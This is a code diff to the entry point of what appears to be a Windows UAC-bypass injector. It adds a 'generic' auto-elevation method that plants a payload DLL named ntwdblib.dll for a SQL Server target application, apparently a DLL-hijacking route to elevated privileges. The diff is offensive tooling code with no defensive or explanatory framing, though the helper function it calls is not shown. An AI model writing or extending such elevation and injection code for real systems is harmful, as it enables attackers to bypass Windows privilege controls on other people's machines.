@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.92
+*  VERSION:     1.93
 *
-*  DATE:        14 Oct 2015
+*  DATE:        05 Nov 2015
 *
 *  Injector entry point.
 *
@@ -287,6 +287,10 @@ UINT ucmMain()
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
+
+	case METHOD_GENERIC:
+		break;
+
 	}
 
 	//prepare command for payload
@@ -433,6 +437,24 @@ UINT ucmMain()
 			OutputDebugString(TEXT("[UCM] H1N1 method called\n\r"));
 		}
 		break;
+
+	case METHOD_GENERIC:
+		if (g_ldp.IsWow64) {
+			ucmShowMessage(WOW64STRING);
+			return ERROR_UNSUPPORTED_TYPE;
+		}
+
+		p = L"ntwdblib.dll";
+
+		if (ucmGenericAutoelevation(
+			METHOD_SQLSRV_TARGETAPP,
+			p, 
+			(CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) 
+		{
+			OutputDebugString(TEXT("[UCM] Generic method called\n\r"));
+		}
+		break;
+
 	}
 	
 	return ERROR_SUCCESS;
